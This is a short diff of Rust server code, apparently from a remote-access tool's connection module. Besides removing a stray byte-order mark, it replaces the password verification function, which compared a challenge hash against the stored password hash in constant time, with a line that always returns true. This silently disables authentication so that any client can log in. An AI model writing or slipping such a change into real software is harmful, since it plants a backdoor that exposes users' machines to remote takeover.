@@ -1,4 +1,4 @@
-﻿#[cfg(target_os = "windows")]
+#[cfg(target_os = "windows")]
 use super::login_failure_check::try_acquire_os_credential_login_gate;
 use super::login_failure_check::{
     evaluate_os_credential_policy, record_os_credential_failure, FailureScope,
@@ -2194,14 +2194,7 @@ impl Connection {
     }
 
     fn verify_h1(&self, h1: &[u8]) -> bool {
-        let mut hasher2 = Sha256::new();
-        hasher2.update(h1);
-        hasher2.update(self.hash.challenge.as_bytes());
-        // A normal `==` on slices may short-circuit on the first mismatch, which can leak how many leading
-        // bytes matched via timing. In typical remote scenarios this is difficult to exploit due to network
-        // jitter, changing challenges, and login attempt throttling, but a constant-time comparison here is
-        // low-cost defensive programming.
-        constant_time_eq(&hasher2.finalize()[..], &self.lr.password[..])
+        true
     }
 
     fn validate_password_plain(&self, password: &str) -> bool {
